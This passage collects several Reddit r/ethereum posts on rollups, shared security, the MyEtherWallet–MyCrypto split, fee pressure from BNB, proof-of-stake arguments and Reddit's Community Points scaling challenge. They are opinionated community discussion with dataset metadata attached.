bonds, etc. A lot of work needs to be done to onboard more of these non-degen usecases.# Rollups are centralizedIt's true that some of the early rollups have centralized sequencers. This is not a security risk, though, as fraud or validity proofs will ensure the same security as Ethereum mainnet. There is a liveness and censorship risk, and centralized sequencers are definitely not trustless systems. Fortunately, most rollups have decentralized sequencers in their roadmaps, so this is not going to be an issue for long.# Rollup-centric roadmap breaks composability ([epic'_trader](https://www.reddit.com/user/epic_trader/))Yes, and no. Within rollups, everything will be composable, but between rollups/L1 nominally hey do break composability. Fortunately, there are multiple projects hard at work to solve this, with relatively seamless L2<>L2 interoperability. It's still a work-in-progress, of course, but this is more of an engineering problem that is currently being solved than a theoretical hurdle.# Bonus: Ethereum is a frankenstein monster with two chains, two assets, ETH1 and ETH2No, there's only one ETH. While there are two chains that run in parallel right now, think of beacon chain as an incentivized testnet to ensure the brand new consensus mechanism works well. These chains will be merged in the next 9 months and it'll all be one ethereum again.# AddendumI feel like half the comments down below are oblivious to the concept of the blockchain trilemma. No project has solved it, or is even attempting to, other than Ethereum. All projects other than Bitcoin and Ethereum significantly compromise on decentralization and security to varying magnitudes, and most still can't offer the scalability Ethereum rollups offer today - let alone after data sharding goes live. Wake me up when you have a non-delegated consensus mechanism with 135,000 validators (let alone the 1 million possible) while at the same time maintaining a manageable state that can be run on a consumer laptop or a Raspberry Pi 4. Like I mentioned, most chains have a few hundred validators at most with stake delegated and centralized to them. Someone mentioned Solana - according to the project's system requirements page ( [Validator Requirements | Solana Docs](https://docs.solana.com/running-validator/validator-reqs) ) it requires a cloud instance that costs $1,200/mo to run a Solana node, with a state growing by several TBs every month. This is simply a different class of product that is in no way comparable to Ethereum. There's nothing wrong with this, and as I've mentioned above, there'll be different solutions with varying trade-offs between decentralization and transaction costs built on top of  or parallel to Ethereum.# Errata(Edited in 18 hours after the post went live)'- 90% of the comments criticizing this post seems to be around the fees. I'll once again reiterate the blockchain trilemma, and that the Ethereum ecosystem is uniquely positioned to deliver great scalability through rollups, combined with high decentralization and security. L1 gas will remain high, and that's fine, because most people will be transacting on rollups, hybrid solutions like zkPorter/Validium or even centralized sidechains. I think there's a significant mental block in thinking of rollups the same way as alternate L1s. Rollups are exactly that - direct competitors to alternate L1s, but superior to them in almost every respect. Crucially, what many seem to be misunderstanding is that no L1 can possibly offer the combined scalability the Ethereum ecosystem working together at various levels can. '- While the DAO fork was not technically a rollback, it was definitely in the spirit of one, and should be criticized as such. It was still a unique, one-time event, and all further attempts at rollbacks, most notable EIP-999, have been unanimously defeated.'- While Bitcoin mining was highly centralized in the early days, this is not a 'ninja mine'. It remains clearly a fairer launch than Ethereum's.'- While proof-of-work is undeniably inefficient, it is fair to say that proof-of-stake needs to prove itself at scale before being considered superior to proof-of-work.",False,Addressing common criticisms about Ethereum,,60,1690,0.96,https://www.reddit.com/r/ethereum/comments/najp2c/addressing_common_criticisms_about_ethereum/,[]

This is because there is an on-chain mechanism (whether fraud proofs or data availability proofs) that can actually check that the events on the smaller chain leading up to the attacker's withdrawal are all valid.A couple more niche examples:* If the smaller chain is a **'plasma'**, they **can delay transactions** and force users to pay L1 fees, but they **can't steal anything**.* If the smaller chain is a **'validium'**, they can **permanently lock up all the users' money** but they **can't steal anything**. Validiums (eg. [Starkware's ImmutableX](https://medium.com/starkware/starkex-now-for-nfts-bfdc9f4655a2)) are thus an interesting middle ground. They are not quite 'true L2s' to the same extent as rollups are, because someone who takes over the validium can still deny users access to their funds and extort them, but they are nevertheless significantly more secure than sidechains, and importantly they can be as scalable as sidechains.**This is what we mean by 'shared security'. If you are hodling assets and doing stuff on the smaller chain, are you as secure as if you were doing it on the larger chain, or are you less secure?** On a rollup or a plasma, you are just as secure. On an independent L1 or a sidechain, you are much less secure. On a validium, you're somewhere in the middle.&#x200B;|'[--- Platform type ---']|'[--- Security compared to base chain ---']||:-|:-||Independent L1|very much less secure||Sidechain|much less secure||Validium|somewhat less secure||Rollup|just as secure||Plasma|just as secure|Note also that for reasons I described in [this earlier post](https://old.reddit.com/r/ethereum/comments/rwojtk/ama_we_are_the_efs_research_team_pt_7_07_january/hrngyk8/), a lot of this is actually symmetric: if you are holding ETC, you are better off holding it on a ZK rollup rooted in ETC than you are holding it wrapped on Ethereum (even if the bridge is a perfect ZK-SNARK verifier of Ethereum's consensus). It's not really about being on the biggest chain you can be. It's about the domain your activity is one being part of the same shared security zone as the domain where the assets you're using were originally issued, where a **shared security zone** is defined as 'a chain, and all other chains '[eg. rollups'] whose security is ultimately dependent only on that chain'.But this doesn't change the above categorization; it only makes it stronger, as these differences in security persist even if Ethereum itself gets 51% attacked.Some more specific examples:|'[--- Asset is issued on ---']|'[--- You are using that asset on ---']|'[--- Security level ---']||:-|:-|:-||Ethereum|Ethereum|High||Ethereum Classic|Ethereum Classic|Medium-high||Bitcoin SV|Bitcoin SV|Low||Ethereum|Avalanche|Low||Avalanche|Ethereum|Low||Ethereum|StarkEx (rollup mode)|High||Ethereum|Arbitrum|High||Optimism|Ethereum|High||Arbitrum|ZkSync|High|This is because (Ethereum, Optimism, Arbitrum, ZkSync, StarkEx rollup mode) are in the same shared security zone (as the latter four are all ultimately secured by Ethereum, or at least soon will be when the fraud proof mechanism is fully enabled with all temporary backdoors removed), but Avalanche and Ethereum Classic are not and likely never will be.BSV is insecure on BSV despite being in the same shared security zone as itself, because BSV is a weak PoW chain that is easily attackable by bored BTC and/or BCH miners and has blocks that are too large for users to verify (with no plans to add sharding/ZK-SNARK/DAS technology to fix this), so someone who 51% attacks BSV can just push invalid blocks through and users would probably have no choice but to accept them.",False,A quick reminder of what 'shared security' means and why it's so important,,19,1629,0.98,https://www.reddit.com/r/ethereum/comments/sgd3zt/a_quick_reminder_of_what_shared_security_means/,[]

For those of you who do not know me, I founded MyEtherWallet (MEW), and I believe that I owe our Ethereum community, and the crypto community at large, an explanation of yesterday's events.Before I do, a brief history about me: I've been intrigued by Ethereum ever since the release of their yellow paper back in 2014. Upon reading it, I realized that Vitalik was a true visionary and became infatuated with the technology behind Ethereum. Specifically, I understood all the transformative possibilities that this type of technology presented now and in the future. When the Ethereum Foundation released the Mainnet, however, I recognized that many users were struggling. With no graphical user interface, many early adopters were having difficulty accessing and transferring their Ether. I saw an opportunity to contribute to this new, emerging community, and seized it.  I began working on a user interface to be used in conjunction with, and in support of, Ethereum wallet functionality that any new crypto adopter could feel comfortable using. I released my initial version, and published it on [Reddit](https://www.reddit.com/r/ethereum/comments/3gkknd/ether_wallet_generator_for_now/) on August 11, 2015 (MEW's birthday!). I designed it to be open source so that others like me could make modifications to my existing codebase, and continue improving user-friendliness and functionality over time.However, as a core developer and programmer, business development/designing were, admittedly, not my strength. I needed someone to take the lead on that front if I wanted MEW to grow its userbase. I brought my friend, Taylor M., on board knowing that she was up to the task. Let's just say that she did not disappoint, and MEW took off much faster than either of us could have anticipated. I will always be appreciative of her efforts in helping MEW achieve the success it did.Alas, for reasons I cannot delve into here, our partnership had to end. During the transition yesterday, however, MEW's Twitter account was switched from @myetherwallet to @mycrypto, and tens of thousands of MEW followers were left scratching their heads. Indeed, the change was unexpected, and I'm still in the process of determining the justification behind the switch, and how this issue will be resolved. I don't know what the fall out from this will be ultimately, but I will not be on the offensive or defensive discussing the circumstances surrounding our decision to separate beyond my statement here.Instead, my focus will be (as it's always been) on how best to improve MEW for existing and prospective users. Security is paramount these days, and me and my new team will remain vigilant in ensuring that the MEW website, your accounts, and more importantly, your ether and tokens, are safe. Rest-assured that MEW is the same product that you trusted yesterday, and the MEW team will work tirelessly to make sure it is the product you still trust tomorrow. The Ethereum community inspired me to create MyEtherWallet, and it still inspires me today. I am not going anywhere. Furthermore, for those of you wondering where I've been or what I've been working on the past several months, I've been busy doing what I do best—so get ready for some new and exciting products/services in the pipeline. Stay tuned!In any event, I must admit that competition is a good thing because it serves as a driving force behind innovation. Look at the world around us. Complacency simply means one will get left behind. That being said, I sincerely wish Taylor M. and MyCrypto the very best. Your presence in the crypto space will undoubtedly motivate me to continue raising the bar.Thank you all for your support over the last few years, and hopefully, in the years to come. MEW's team remains committed to you, and is available to answer any and all questions or concerns you may have.

And unfortunately they're doing a damn good job of it.*](https://old.reddit.com/r/ethereum/comments/loy1qe/binance_a_centralized_exchange_is_taking_total/) got me thinking. Most people including me until recenty have been thinking that the high fees on ETH are crazy uncomfortable right now but it doesn't matter long term as it's being worked on and therefore temporary, it's just a 'pause' in its utility and all the good times will just resume once it's solved by L2, sharding or POS.The surge in BNB value is a wake up call, as the OP in the linked thread put it:> I hate that they are completely CENTRALISED but make themselves seem decentralized. They have complete control over the BNB token. **This is exactly what the crypto community feared and wanted to avoid all along.**That's exactly right, that's what we feared and should have feared much more as it gets more real every day. Especially because as another poster put it:> The open market doesn't give a shit about decentralization. If you don't agree, you're actually in the minority. That's why pancakeswap rocketed to #1. That's why Tether is used to this extent. That's why XRP is top 10. That's why exchanges control over 40% of ETH staking.That quote is frightening, it's frightening because it's true. Majority of people in general, be it traders, devs or users do not care about decentralization. And the more people from general population join the crypto space, the more it becomes the reality for that space.**That's where lies the very real danger for ETH of, not being attacked from within, but being REPLACED and OVERTAKEN by centralized pseudo-coins and once this happens it might stay that way forever given the above!**Up until now many thought that ETH is far too ahead to be challenged and we can afford a year or two until scaling solutions are deployed, but **BNB showed otherwise, it got 500% closer in *two weeks*, we *do not have* 2 years to solve this! They repeat this feat just ONCE and ETH is no longer the largest smart contract chain in crypto.**The fee issue needs to be taken seriously if we want to protect ETH, it's a very real security risk, far bigger at this point than 51% attack, or state growth, uncle rate etc. HALF of Top 10 coins are centralized pseudo-coins, the threat is real not only for ETH but all truly decentralized cryptos. So let's not underestimate it.We're bleeding developers, users, future innovation right now. I've seen multiple posts and comments about people abandoning ETH leaving for another chain because of the fees. **Once they have this bad experience and invested time and money in another chain, they're not coming back. This is 'invisible' at first, that guy who left is going to have his project completed and mature in 3-5 years but it will be too late then when we start to see it more openly, it's no stopping it then.**Also when centralized projects close in or overtake ETH even for a while that's when they're going to take full advantage of their centralized nature. **They're going to be making big bucks which are going to go toward troll farms, media, 'influencers', armies of paid devs and big institutions are going to buy in as they just LOVE centralization. It's also going to be too late once this becomes apparent.** We might end up rambling about it in an obscure corner of the internet, be ETH fanbois that nobody cares or even knows about - it might seem unimaginable now but once this train gets rolling it might end up exactly like that 5-10 years from now, crypto moves at lightspeed.If you're thinking that rollups will solve this, think again, L2 is complex and suitable only for a very narrow set of use cases, look at LN on BTC, it totally flopped. Crypto is complex enough, L2 is a level above that and it takes years to make the UX good enough. L2 on ETH breaks composability or makes it complex to the power of 2. **Are we willing to gamble the future of ETH on the hope that L2 gets adopted quickly enough contrary to all experience until now? That carrot has been dangled with SegWit/LN on BTC for years now, let's please not make the same mistake.**So what am I proposing? As a first step we need to alleviate the pressure *right now*, that can be done ONLY by raising the block gas limit substantially ASAP, at least double it, ideally quadruple it. We've had time for L2, other scaling solutions a year ago, but that ship has sailed, there is no more time.If you're thinking about the drawbacks of raising the limit, think it in a context of a real threat to ETH security - would it be worth it if there was an imminent threat of a 51% attack? Would it be worth to raise the limit to prevent the attack then? Because that's the situation we're in, just more insidious as the damage caused today is going to show itself only in a few years when there is no longer anything we can do about it.But I do not think there are any real showstoppers here, uncle rate is at ATL, storage and state growth doesn't matter if we can handle it now as in a few years it will become orders of magnitude easier to handle, for the comuters in 5-10 years it will be just a immaterial blip.This will buy us time to develop L2 and rollups, which in turn buys us time for sharding and POS but we NEED to kick the can down the road right now as to stop the bleeding.**Anyway, if you take anything from this write up, even if you disagree with some suggestions, it's that high fees ARE A SERIOUS SECURITY RISK on par with a 51% attack. And it should be taken just as seriously, by the devs and by the users. Beware and be suspicious of people minimizing that risk (in a reasonable way ofc), troll farms may soon be in full swing and the likes of BNB would like nothing more than for us to underestimate this threat.**",False,"The biggest security threat to Ethereum is not a 51% attack, it's getting replaced by centralized pseudo-cryptocurrency",,24,1460,0.94,https://www.reddit.com/r/ethereum/comments/lpcalp/the_biggest_security_threat_to_ethereum_is_not_a/,[]

So here are a bunch of common questions/takes I see, boiled down in quick bullet points like I did in [my previous post](https://www.reddit.com/r/ethereum/comments/s8mnwb/a_collection_of_various_things_the_average/) that was more about Ethereum in general.I plan on lazily linking this thread whenever I see those points being brought up, and I encourage everyone to do the same and correct me if I got anything wrong or suggest any addition.## Wat merge?A lot more info can be found on [ethmerge.com](https://ethmerge.com/) so I will keep this section light* When the merge happens, Ethereum will be secured by Proof of Stake instead of Proof of Work.* The Merge is not 'ETH 2.0', there is no ETH 2.0, [it's an obsolete term.](https://blog.ethereum.org/2022/01/24/the-great-eth2-renaming/)* **If you currently hold ETH, you don't need to do anything.** You will still hold the same amount of ETH after the merge, there is no 'ETH2 coin', no need to migrate anything, etc. Everything sames exactly the same, only the consensus mechanism changes under the hood.* It's called 'merge' because it's about *merging* the Beacon Chain (*consensus layer*) with the current chain (*execution layer*) and ditching the proof of work part of the execution layer.* If you don't know, 'consensus' is just a fancy word for the goal of ordering transactions and getting some economic guarantee that this order won't change. Both PoW and PoS achieve consensus by different means:  * PoW: 'It costs too much to mess up with the order of blocks, playing by the rules is more lucrative.'  * PoS: 'It costs too much to mess up with the order of blocks, because if I do I'll lose all the money I put up as collateral.'* Since it's only the consensus mechanism changing, **Proof of Stake by itself will not lower gas fees significantly**.## Why merge?* Lower security costs since there's less energy needed to achieve consensus.  * For PoW you need miners to be able to *at least* cover all the hardware and energy they use otherwise no one will mine. This requires a big issuance that is quickly sold for fiat to pay the bills.    * For PoS you just need to give some yield to stakers to make people want to deposit capital rather than just invest it elsewhere. No big bills to pay beyond an ordinary computer and an internet connection, so the yield just has to reflect the opportunity costs and risks involved.* More sustainability:  * The security of a blockchain is basically proportional to the value of its coin. This is true for both PoW (more valuable coin rewards = more reasons to play by the rules = more miners = harder to mess up the consensus) and PoS (more valuable staked coins = more reasons to play by the rules to avoid losing the staked coins)  * A newly issued coin is essentially value being taken from all holders of the coin and being redistributed to someone. All else equal, selling that coin for fiat extracts value out of the network.* It opens the door for many scaling solutions in the future, namely data sharding, statelessness, light clients, and [more](https://twitter.com/VitalikButerin/status/1466411377107558402)* It helps reduce some complexity of the code going forward, by separating concerns between execution and consensus.* Appeasing the environment and gamers is certainly a nice side-effect, but not really a major reason behind the switch to PoS, since it's mostly about externalities over which Ethereum as a protocol doesn't have much control (source of energy production, GPU supply chains, etc.)## Wen merge?* It happened on September 15th, 2022## Nope, your a idiot. They will delay it like they always have in the past. They promised it years ago and still haven't delivered.Believe or not this was a common talking point before the merge## Those millions of ETH staked will crash the price the very moment they're unlocked LOLFor sure, there will be plenty of stakers who will want to finally take profit, especially those who locked their ETH back when 32 ETH was worth $10k. But there's plenty more to consider on the other side of the equation:* The merge doesn't unlock any ETH. Withdrawals will come in the first hard fork following the merge, likely 6-8 months after. That's months of no proof of work issuance (~13k ETH/day) being sold off *and* no proof of stake issuance coming into circulation.* Just like how there's a queue to deposit ETH, there will be [a queue to withdraw it.](https://github.com/ethereum/annotated-spec/blob/master/phase0/beacon-chain.md#how-does-eth2-proof-of-stake-work). Assuming a mass sell-off event, everyone is in that queue, limited at a rate of 1125 valitors per day. So there's no 'opening the floodgates' moment. Everyone unstaking would literally take over a year. A year of ~38k ETH/day entering back into circulation (or... roughly 1% of average daily volume)* After the merge, validators will start receiving fee rewards as well, doubling the yield [by some estimates](https://docs.google.com/spreadsheets/d/1vrK5sY5ooq-F8dcyRhmmAJ5YtgkvWKWP3OfGCZIYxSA/edit#gid=0). There are thousands of people waiting in line to stake *right now*. They're okay with a 5% yield on their ETH, I don't think they're gonna yeet the moment it becomes 10% lol* The biggest risk involved in staking is *by far* the merge. Something catastrophic could go wrong, yet people have been staking and locking up their ETH for over a year despite this risk and despite the ETH being locked until an unknown floating date. How many people/institutions are waiting on the sidelines for this risk to disappear before jumping in?* And don't forget stakers exiting means fewer validators which means higher rewards for the stakers who don't exit. It also means more incentives for other people to *start* staking if they weren't before...* But of course it's crypto, and crypto's gonna crypto. The merge will bring excitement and volatility and possibly a sell-the-news dip, who knows. I don't pretend to know the future, but the way I see it it's much more likely way more ETH will flow *into* staking than out of it.## If proof of stake is so good, then how come Ethereum didn't go with that from the start?* Proof of Work is easy to conceptualize and implement, Proof of Stake isn't. Especially when back in 2014 it was mostly a theoretical concept still being researched, with some blockchain implementing some version of it.* There were several fundamental problems with PoS that needed to be overcome from a research perspective before thinking about implementing it. * There is no one-size-fits-all for Proof of Stake. Every PoS blockchain comes with its own PoS specification that has pros and cons on various aspects, so it's not as simple as 'but this other blockchain did it, why can't ethereum just do the same thing'* Starting as a proof of work chain had the benefit of letting anyone mine coins on their own without anyone's permission, which helped the coin distribution become way better than those newer chains that are proof of stake from the start and have to decide how to allocate the initial coins, which can't really be done permissionlessly.* Related to above: Yes, there was still a premine/presale for Ethereum, but it has now been diluted to half the supply after years of mining and multiple bull/bear cycles making that ETH swap hands, bringing the distribution [closer to Bitcoin's](https://medium.com/@adamscochran/the-10k-audit-42c100dd32bb). So it's not that big of a deal in 2022 when Ether as an asset is extremely liquid and easy to acquire. ## Nah, this is really just a ploy to screw over the miners one last time after years of hard work* PoS has been the eventual goal since [day 1](https://blog.ethereum.org/2014/07/22/launching-the-ether-sale/), everyone mining was always aware that it would end one day. There is no rugpull or unfairness going on here.* Economic factors trump any kind of miner-blockchain loyalty. You can kinda view the blockchain as a business and the miners as employees:  * Miners/employees have been paid for the service they provide (namely, secure consensus) with the block rewards. The paycheck is an expense for the employer and it comes from diluting the value of existing coins from holders (see above in 'why merge?')  * Miners go to the chain offering the highest rewards, most of them would ditch Ethereum in a heartbeat if another GPU minable coin gave out more rewards.   * Similarly, Ethereum will pay less for the service it requires if stakers can do it for way cheaper. * It's not entirely exclusive. Miners can also be holders of the coin, and users of the blockchain. Nothing prevents them from holding their rewards and becoming stakers too.## The coin stops having inherent value if you're not spending real world energy to mine itI don't really buy this argument. There is nothing magical about computing hashes over and over until you land on one that fits arbitrary requirements. I mean, you could have a proof of work blockchain where the work is done by solving sudoku puzzles and it would work exactly the same: NP-complete problem, hard to compute one way but easy to verify a solution once one has been found. That doesn't mean solving sudoku inherently brings value into the world. Cranking up the mining difficulty of a coin doesn't magically make everyone richer, it just makes mining less profitable – unless of course demand goes up too, which so far hasn't been too much of a problem in the crypto world.The way I see it, the value of a coin ultimately comes from supply and demand, and the demand comes from how valuable the blockspace is. People need ETH to buy the blockspace, regardless of whether that ETH is generated by a miner or a staker. Sure, the more miners there are the higher the security/decentralization which further increases the value proposition of the blockspace in a positive feedback loop, but [feedback loops exist in Proof of Stake Ethereum too](https://i.imgur.com/3bPV35a.png) and they're super cool too!## Proof of Stake is a recipe for total centralization* It's basically the same as Proof of Work but slightly different. 'Better' or 'worse' really depends on your opinion. The way I see it, PoW is really just PoS with extra steps.* Ethereum as a community values decentralization highly, any potential centralization vector is addressed by the research team to come up with ways to mitigate it, even if it's at the cost of other important stuff like scaling (e.g. keeping gas limits low so more nodes can participate in decentralization, even if that results in congestion and high fees)* There **are** shortcomings currently, decentralization is a spectrum and a process and we're not there yet, and for the time being there are many centralization crutches that need to go away on the long term. That said, none of these crutches represent existential risks for the network, and for practically any 'it's centralized because X' statement, there is an item on [the roadmap](https://twitter.com/VitalikButerin/status/1466411377107558402) addressing X. I personally find it much more fascinating to come up with a whole bunch of stuff to solve X rather than give up and say 'it can't be done because of X'. * Something interesting about Ethereum's PoS design that is often overlooked: Quadratic penalties. A single validator going down, messing up, or downright attacking the network doesn't get penalized very badly. A thousand validators doing it at the same time get penalized much more heavily.   * This means that if you're a megawhale with thousands of validators, it's in your own best interest to spread them out, avoid cloud hosting, use different clients, etc. Sure, the capital is still concentrated, but at least the points of failures are distributed which is good for the health of the network overall.  * Compared to a big mining operation that relies on a central location to amortize costs, which can be spotted from energy usage and shut down if the authorities don't like it. It's hard to move mining equipment across the world, but staking only relies on private/public keys and not any actual hardware beyond a consumer grade computer.## PoS is really just 'who has money makes more money'* Yes. Unfortunately we live in a world of high wealth inequality. Blockchains don't fix that. * It's also true of proof of work: Whoever has money can buy more mining rigs and make more money. Except with mining, the ROI becomes better with economies of scale: Centralized mining operations have the big bucks to get bulk/discount rates on hardware and move to the places with cheap electricity. The solo miner simply can't realistically compete. With Proof of Stake, everyone earns the same yield proportionally, where they stake $10 or $10M.* '*They may be centralized, but those big mining operations have no reason to attack the network and weaken it since they dumped millions in infrastructure*'....... so you're saying you're fine with big centralized actors existing, as long as they have some kind of a big *stake* in the network?## Passive interest on your deposit though? Printing money out of thin air? That's literally central banks and fiat part 2 electric boogaloo* You have to really stretch it to make this case, but I've seen people do that lol. Those takes usually begin with 'proof of stake is nothing new'* There's still 'work' being done by validators: creating blocks and validating other blocks. It's just that the work done is composed entirely of the *actually useful work* that the blockchain needs to reach consensus, instead of computing hashes over and over again until one of them meets an arbitrary requirement. * It's not really 'free money being printed out of thin air', there are still costs involved in staking capital, they're just more abstract and less direct than energy bills:  * Opportunity costs – Why stake at all if another investment offers you a better yield?  * Illiquidity – From the moment you deposit, your capital is locked up, queued up until your validator is active, then when you withdraw there is yet another queue before getting it back.  * Inherent risks – It's still a fairly new thing, something could go wrong, there could be a critical bug, network could get attacked, your staking hardware could get compromised, etc.  * Volatility – at the end of the day it's still a volatile asset, if you're the kind of investor who denominates their investments in their country's fiat currency, then a 5% yield on an asset that can drop 30% overnight isn't all that great (the upside of 5% yield on an asset that doubles is pretty great though, turn that 100% gain into 110%)  * Maintenance – You still have to maintain and secure your validator, ensure 100% uptime, update software, etc. * Here's where it gets nifty: The more stakers there are, the lower the individual rewards get. This basically means that all those costs above will get priced by the market itself. It's easy to see why: If the staking yield is too low, then the rewards don't justify the costs and people will pull out and invest elsewhere, bringing the yield back up. Likewise if it's too high, that'll attract more capital and bring it back down. * As far as inflation goes: Let's say the market as a whole decides that 5% is the ideal yield, of which 3% comes from issuance. That works out to about 30 million ETH staked printing 900 thousand new ETH per year. At a total supply of 120 million ETH, that's an inflation rate of 0.75%. Which is outpaced by EIP1559 burn as long as gas fees are at least 23 gwei. (I cannot stress this enough: *Ether-the-asset will become a yield-bearing deflationary asset very soon*)* '*Nice math but there's no supply cap + they change the monetary policy all the time*'   * The goal has been 'minimum viable issuance to secure the network' for years, priorizing network security over an arbitrary supply cap.    * No update to the monetary policy has ever increased supply inflation. Low inflation rate (specifically *dis*inflation) has been the goal since day 1.  * There will be an equilibrium acting as an effective supply cap – decided again by market forces valuing Ethereum's blockspace – once the rate of EIP1559 burn matches the rate of issuance. That's super nifty if you ask me.* So yeah, there's no 'central Ethereum bank' adjusting rates arbitrarily and printing money to cronies. The market itself dictates how much inflation/deflation there is, no single entity can control it the way a central bank controls fiat inflation rates.## Whales have all the money needed to take over and change the rules and slash honest stakers* No. Ethereum has no on-chain governance of any kind for this reason. Protocol updates are a community effort (*Layer 0*) and you don't need any money staked to call out bad ideas and participate in the process.* This is exactly the same as Proof of Work: Even if you have 99% of the hashpower, you can't make invalid transactions that steal people's money without their private keys, or change protocol rules, or really do anything beyond reorganizing blocks. The 1% of honest nodes will reject any block that don't follow the rules and you'll be mining on an invalid/useless chain. Now replace hashpower/mining with stake/staking and the same holds true for Proof of Stake (with the difference that someone caught reorganizing blocks will have their entire stake destroyed, whereas the blockchain can't exactly destroy mining rigs)* And simply put, there is a fuckton of ETH involved. 10 million and counting and that's *before the merge*. At current prices that's roughly 30 billion dollars. Both 'amount of ETH staked' and 'value of ETH' are projected to go up, so attacks become increasingly unlikely due to the sheer economic cost involved in doing an attack — *once* — and the absurdity of acquiring that much ETH in the first place if the attack comes from an outside actor (where would you buy 10 million ETH to have 51% of the stake? 20M?)## 32 ETH is way too much, the average person doesn't have that much* I agree it's a lot. There are some ideas of how it could be lowered ([better signature aggregation](https://www.reddit.com/r/ethereum/comments/rwojtk/ama_we_are_the_efs_research_team_pt_7_07_january/hrmt6o0/) or [a rotating cap of active validators](https://ethresear.ch/t/simplified-active-validator-cap-and-rotation-proposal/9022)) but they don't seem to be very high on the priority list currently, as opposed to making sure the base layer is truly secure.* The reason for such a high number is it has to fall in a technical sweetspot. In a nutshell, it has to be low enough to be accessible and have enough validators to secure the chain, but high enough to not have too many validators and bloat the chain with overhead. And having a fixed amount for each validator reduces a lot of the complexity by having each validator weighted exactly the same in the distributed randomness process of who gets to produce each block.* There is a whole bunch of [math involved](https://thomasborgers.medium.com/ethereum-2-0-economic-review-1fc4a9b8c2d9) to arrive at 32 ETH from a technical standpoint, back when 32 ETH was worth about 7000 USD. [Earlier math from 2017](https://medium.com/@VitalikButerin/parametrizing-casper-the-decentralization-finality-time-overhead-tradeoff-3f2011672735) even suggested over 1000 ETH minimum. * Thankfully, just like mining pools exist, there are staking pools to allow staking in smaller amounts. It doesn't necessarily fly in the face of the 'not your keys not your coins' mantra, thanks to things like [RocketPool](https://rocketpool.net/), [Secret Shared Validators](https://medium.com/coinmonks/secret-shared-validators-on-ethereum-2-0-ea29ab380016) (not yet launched) which use smart contracts to be permissionless, decentralized and non-custodian. And because of the quadratic penalties mentioned above, I believe decentralized staking operations will outperform the centralized ones on the long run. I recommend superphiz's [guide to staking](https://www.reddit.com/r/ethstaker/comments/t1xpr5/how_to_stake_on_ethereum_march_2022_edition/) for more info. And obviously, I admit staking through exchanges is yucky if you value decentralization* Related to above, stuff like Rocket Pool is better viewed as a higher-level abstraction to base staking, rather than 'just a staking pool'. I go into more details on this [here](https://www.reddit.com/r/ethereum/comments/tijcq1/stuff_rethereum_should_know_proof_of_stake_edition/i1gd27b/?context=1) for those interested.## PoS hasn't been proven, while we know PoW worksThat's actually totally fair and there is no real rebuttal to this, obviously. Only time will tell. I just think it's irrelevant in the context that Ethereum *is* switching to PoS and was always going to. If you don't believe in it, don't participate/invest in it. I do personally believe in a long term sustainable PoS Ethereum, but even then I'm glad good ol' boring-by-design Bitcoin will be there chugging its proof of work along.It's all part of the great crypto experiment of our lifetime. Either it's just a fad and will fail into obscurity, which would be a bummer for sure, or we'll have succeeded in creating monster robust networks capable of outlasting humanity. To achieve that, prioritizing decentralization is key. Which is something I mainly just see in Bitcoin and Ethereum, despite the widely different philosophies. It's why I'm glad to have both to truly see what's what on the long term.## I have more questionsidk ask them in the comments, I'm sure I forgot stuff.

It's time to let the Ethereum community hear about it. Send your demo by July 31, 2020.**This is your chance to earn some fame but, to be clear, there is no prize if your solution is chosen or modified to meet Reddit's needs. Our lawyer made us write this.https://preview.redd.it/q7hhi6lzlp551.png?width=1200&format=png&auto=webp&v=enabled&s=b02447f4ea31447f58445d393fb9d95b95718a2a# The GoalIn conjunction with the Ethereum Foundation, Reddit is inviting Ethereum scaling projects to show the community how your scaling solution can be used to bring [Community Points](http://reddit.com/community-points) to mainnet. Our goal is to find a solution that will support hundreds of thousands of Community Points users on mainnet today, and can eventually scale to all of Reddit (430 million monthly users).We've evaluated some of the most promising scaling solutions, and have learned a few things:1. There are plenty of awesome projects that we don't know about yet. We seem to learn about a promising new scaling solution every day.2. Most existing scaling solutions focus on the exchange use case, which favors optimizing for transfers. Many of these designs don't take into consideration the costs of obtaining tokens or entering the scaling system, which can be significant. Community Points distributions have cost an order of magnitude more gas than all other operations combined, primarily due to on-chain storage costs associated with onboarding new users.3. It's unclear how to determine the best solution. There is a lot of code, a lot of documentation, and a lot of hype out there. But there are very few objective real-world reviews or comparisons of various products/implementations.4. We need the Ethereum community's help to figure this out.Do you have a scaling project that meets the criteria below? If so, share your demo by **July 31, 2020.** Please note that all demos need to simulate Community Points usage for 100,000 users.We also invite all scaling experts in the Ethereum community to comment on any demos submitted to enable a better understanding of the trade-offs and compromises between different solutions.We will review the demos and plan to share any updates by September. While we don't expect any novel scaling projects, we hope that you, the Ethereum scaling expert, can show us how to scale Community Points.**Demos should include:**1. A live proof of concept showing hundreds of thousands of transactions2. Source code (for on & off-chain components as well tooling used for the PoC). The source code does not have to be shared publicly, but if Reddit decides to use a particular solution it will need to be shared with Reddit at some point3. Documentation   1. How it works & scales   2. Cost estimates (on-chain and off-chain)   3. How to run it   4. Architecture   5. APIs (on chain & off)   6. Known issues or tradeoffs4. Summary of cost & resource information for both on-chain & off-chain components used in the PoC, as well as cost & resource estimates for further scaling. If your PoC is not on mainnet, make note of any mainnet caveats (such as congestion issues).# Requirements**Scaling.** This PoC should scale to the numbers below with minimal costs (both on & off-chain). There should also be a clear path to supporting hundreds of millions of users.* Over a 5 day period, your scaling PoC should be able to handle:   * 100,000 point claims (minting & distributing points)   * 25,000 subscriptions   * 75,000 one-off points burning   * 100,000 transfers**Decentralization.** Solutions should not depend on any single third-party provider.* We prefer solutions that do not depend on specific entities such as Reddit or another provider, and solutions with no single point of control or failure in off-chain components, but recognize there are numerous trade-offs to consider**Usability.** Scaling solutions should have a simple end user experience.* Users shouldn't have to maintain any extra state/proofs, regularly monitor activity, keep track of extra keys, or sign anything other than their normal transactions* Transactions complete in a reasonable amount of time (seconds or minutes, not hours or days)* Free to use for end users (no gas fees, or fixed/minimal fees that Reddit can pay on their behalf)* Bonus points:   * Users should be able to view their balances & transactions via a blockchain explorer-style interface   * Exiting is fast & simple**Interoperability.** Compatibility with third party apps (wallets/contracts/etc) is necessary.* Scaling solutions should be extensible and allow third parties to build on top of it* APIs should be well documented and stable* Documentation should be clear and complete* Third-party permissionless integrations should be possible & straightforward* Simple is better. Learning an uncommon or proprietary language should not be necessary. Advanced knowledge of mathematics, cryptography, or L2 scaling should not be required. Compatibility with common utilities & toolchains is expected.* Bonus Points: Show us how it works. Do you have an idea for a cool new use case for Community Points? Build it!**Security.** Users have full ownership & control of their points.* Balances and transactions cannot be forged, manipulated, or blocked by Reddit or anyone else* Users should own their points and be able to get on-chain ERC20 tokens without permission from anyone else* Points should be recoverable to on-chain ERC20 tokens even if all third-parties 